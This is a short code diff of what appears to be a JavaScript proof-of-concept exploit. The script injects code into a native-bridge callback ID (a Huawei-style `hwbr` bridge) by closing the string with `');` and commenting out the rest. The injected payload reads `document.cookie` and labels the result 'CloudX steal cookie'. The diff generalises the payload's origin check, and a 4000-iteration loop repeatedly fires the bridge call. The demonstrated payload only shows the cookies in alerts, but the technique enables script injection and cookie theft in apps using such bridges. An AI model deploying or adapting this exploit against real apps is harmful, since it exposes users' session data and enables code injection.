@@ -18,8 +18,8 @@
             }
         });
 
-        // 精简payload：移除冗余判断，压缩为单行
-        const payload = `alert('cloud:'+document.cookie);window.hwbr=window.hwbr||{};window.hwbr.callbackFromNative=window.hwbr.callbackFromNative||(()=>{});if(!location.href.startsWith('https://h5hosting-drcn.dbankcdn.cn')&&!window.__cloudx_called){window.__cloudx_called=true;alert('CloudX steal cookie : '+document.cookie);}`;
+        const currUrl = location.href;
+        const payload = `alert('cloud:'+document.cookie);window.hwbr=window.hwbr||{};window.hwbr.callbackFromNative=window.hwbr.callbackFromNative||(()=>{});if(!location.href.startsWith("${currUrl}")&&!window.__cloudx_called){window.__cloudx_called=true;alert('CloudX steal cookie : '+document.cookie);}`;
         const callbackId = `${service}${genCallbackId()}');${payload}//`;
 
         // 缓存回调函数
@@ -29,7 +29,7 @@
         const nativeBridge = window[bridgeName] || {
             invoke: () => `F08 ${callbackId} s no native object ${service}:${action}`
         };
-        
+
         for (let i = 0; i < 4000; i++) {
             setTimeout(() => {
                 try {
